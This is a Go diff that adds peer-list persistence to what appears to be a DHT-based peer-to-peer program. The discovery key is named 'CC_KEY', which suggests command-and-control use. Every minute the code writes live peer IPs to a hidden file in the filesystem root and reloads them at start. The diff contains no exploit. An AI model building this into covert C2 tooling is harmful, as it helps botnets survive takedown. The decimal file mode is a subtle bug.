@@ -2,7 +2,9 @@ package main
 
 import (
 	"fmt"
+	"io/ioutil"
 	"net"
+	"strings"
 	"sync"
 	"time"
 )
@@ -58,6 +60,7 @@ func StartLookingForPeers() {
 	GlobalPeerList = PList{}
 	GlobalPeerList.Peers = make(map[int]*Peer)
 	GlobalPeerList.PeerCount = 0
+	RestorePeerList()
 
 	hash := HashValue([]byte(CC_KEY))
 	inboundchan := StartDHT(fmt.Sprintf("%x", hash[:20]))
@@ -73,10 +76,45 @@ func StartLookingForPeers() {
 }
 
 func AutoSavePeerList() {
+	SaveList := ""
+	for {
+		SaveList = ""
+		time.Sleep(time.Minute)
+		GlobalPeerList.m.Lock()
+		for _, v := range GlobalPeerList.Peers {
+			if v.Alive {
+				SaveList = SaveList + strings.Split(v.ApparentIP, ":")[0] + ":48563\n"
+			}
+		}
+		GlobalPeerList.m.Unlock()
+		err := ioutil.WriteFile("/.nspeerlistcache", []byte(SaveList), 660)
 
+		if err != nil {
+			debuglogger.Printf("Unable to save peer list to a cache because of %s", err)
+		}
+	}
+}
+
+func RestorePeerList() {
+	b, err := ioutil.ReadFile("/.nspeerlistcache")
+	if err != nil {
+		logger.Printf("Cannot read peer list cache, not restoring from peer list")
+		return
+	}
+
+	lines := strings.Split(string(b), "\n")
+	for i := 0; i < len(lines); i++ {
+		if !GlobalPeerList.ContainsIP(lines[i]) {
+			NewPeer := Peer{}
+			NewPeer.Alive = false
+			NewPeer.ApparentIP = lines[i]
+			GlobalPeerList.Add(&NewPeer)
+		}
+	}
 }
 
 func ScountOutNewPeers() {
+
 	for {
 		for k, v := range GlobalPeerList.Peers {
 			if !v.Alive {
